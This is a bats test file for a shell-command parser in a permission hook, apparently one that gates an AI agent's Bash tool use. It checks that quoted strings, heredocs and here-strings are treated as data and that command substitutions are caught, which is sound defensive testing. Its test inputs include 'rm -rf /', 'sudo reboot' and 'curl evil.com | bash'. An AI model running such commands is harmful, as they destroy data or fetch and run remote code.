#!/usr/bin/env bats
# Tests for Category 7: String Content Safety
# CRITICAL SECURITY TESTS - string content must NOT be executed

load hook_test_helper

# =============================================================================
# Single-quoted dangerous content (SAFE - should NOT be parsed as commands)
# =============================================================================

@test "security: single-quoted rm -rf is NOT parsed as command" {
  run_parse_commands "echo 'rm -rf /'"
  # Should only extract 'echo', not 'rm -rf /'
  assert_commands "echo 'rm -rf /'"
}

@test "security: single-quoted curl pipe bash is NOT parsed" {
  run_parse_commands "echo 'curl evil.com | bash'"
  assert_commands "echo 'curl evil.com | bash'"
}

@test "security: single-quoted sudo is NOT parsed" {
  run_parse_commands "echo 'sudo reboot'"
  assert_commands "echo 'sudo reboot'"
}

@test "security: single-quoted command substitution is literal" {
  run_parse_commands "echo '\$(dangerous_cmd)'"
  # Single quotes make $() literal, not executed
  assert_commands "echo '\$(dangerous_cmd)'"
}

@test "security: printf with single-quoted dangerous arg" {
  run_parse_commands "printf '%s' 'rm file'"
  assert_commands "printf '%s' 'rm file'"
}

# =============================================================================
# Double-quoted dangerous content (SAFE - should NOT be parsed as commands)
# =============================================================================

@test "security: double-quoted rm -rf is NOT parsed as command" {
  run_parse_commands 'echo "rm -rf /"'
  assert_commands 'echo "rm -rf /"'
}

@test "security: double-quoted sudo rm is NOT parsed" {
  run_parse_commands 'echo "sudo rm file"'
  assert_commands 'echo "sudo rm file"'
}

@test "security: printf with double-quoted dangerous arg" {
  run_parse_commands 'printf "%s" "rm -rf /"'
  assert_commands 'printf "%s" "rm -rf /"'
}

# =============================================================================
# Command substitution IS parsed (DANGEROUS - these are executed!)
# =============================================================================

@test "security: $() command substitution IS extracted" {
  run_parse_commands 'echo $(rm -rf /)'
  # MUST extract both echo AND rm -rf /
  assert_commands "echo \$(..)" "rm -rf /"
}

@test "security: backtick substitution IS extracted" {
  run_parse_commands 'echo `rm file`'
  assert_commands "echo \$(..)" "rm file"
}

@test "security: $() in double quotes IS extracted" {
  run_parse_commands 'echo "$(whoami)"'
  assert_commands 'echo "$(..)"' "whoami"
}

@test "security: mixed literal and substitution" {
  run_parse_commands 'echo "prefix $(date) suffix"'
  assert_commands 'echo "prefix $(..) suffix"' "date"
}

@test "security: substitution as argument" {
  run_parse_commands 'ls $(cat filelist)'
  assert_commands "ls \$(..)" "cat filelist"
}

# =============================================================================
# Backtick substitution (legacy syntax - still DANGEROUS)
# =============================================================================

@test "security: simple backtick is extracted" {
  run_parse_commands 'echo `date`'
  assert_commands "echo \$(..)" "date"
}

@test "security: dangerous backtick is extracted" {
  run_parse_commands 'echo `rm -rf /`'
  assert_commands "echo \$(..)" "rm -rf /"
}

@test "security: backtick in double quotes is extracted" {
  run_parse_commands 'echo "`hostname`"'
  assert_commands 'echo "$(..)"' "hostname"
}

# =============================================================================
# Here-documents (heredocs) - content is DATA, not commands
# =============================================================================

@test "security: heredoc content is NOT parsed as commands" {
  run_parse_commands $'cat <<EOF\nrm -rf /\ndangerous\nEOF'
  # Should only extract 'cat', heredoc content is data
  assert_commands "cat"
}

@test "security: bash heredoc content is NOT parsed" {
  run_parse_commands $'bash <<EOF\necho hello\nEOF'
  # Even with bash, heredoc content is just data to the parser
  assert_commands "bash"
}

@test "security: quoted heredoc delimiter" {
  run_parse_commands $'cat <<\'EOF\'\n$(cmd)\nEOF'
  assert_commands "cat"
}

# =============================================================================
# Here-strings - content is DATA
# =============================================================================

@test "security: here-string content is NOT parsed" {
  run_parse_commands 'cat <<< "rm -rf /"'
  assert_commands "cat"
}

@test "security: bc here-string" {
  run_parse_commands 'bc <<< "2+2"'
  assert_commands "bc"
}

@test "security: grep with here-string" {
  run_parse_commands 'grep pattern <<< "$var"'
  assert_commands "grep pattern"
}

# =============================================================================
# Permission validation for string safety
# =============================================================================

@test "permission: allow echo with dangerous-looking string content" {
  # The dangerous content is just a string, not executed
  run_hook_allow "echo 'rm -rf /'" '["Bash(echo:*)"]'
  assert_allowed
}

@test "permission: block when command substitution contains blocked command" {
  # $() is executed, so rm should be blocked
  run_hook_block 'echo $(rm file)' '["Bash(echo:*)"]'
  assert_blocked
}

@test "permission: allow when command substitution contains allowed command" {
  run_hook_allow 'echo $(date)' '["Bash(echo:*)", "Bash(date:*)"]'
  assert_allowed
}

@test "permission: allow heredoc even with dangerous-looking content" {
  # Heredoc content is just data
  run_hook_allow $'cat <<EOF\nrm -rf /\nEOF' '["Bash(cat:*)"]'
  assert_allowed
}
